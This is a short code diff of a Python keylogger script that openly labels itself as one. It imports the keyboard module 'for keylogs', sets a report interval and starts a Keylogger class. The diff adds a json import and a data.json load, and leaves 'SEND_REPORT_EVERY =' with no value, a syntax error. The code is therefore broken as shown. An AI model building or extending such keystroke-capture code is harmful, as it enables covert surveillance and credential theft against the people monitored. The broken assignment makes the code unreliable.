@@ -1,8 +1,15 @@
 import keyboard # for keylogs
+import json # for the time
 from threading import Timer
 from datetime import datetime
 
-SEND_REPORT_EVERY = 300 # in seconds, 60 means 1 minute and so on
+# report timing
+
+with open("data.json", "r") as d:
+    data = json.load(d)
+    
+
+SEND_REPORT_EVERY =  # in seconds, 60 means 1 minute and so on
 
 class Keylogger:
     def __init__(self, interval, report_method="file"):
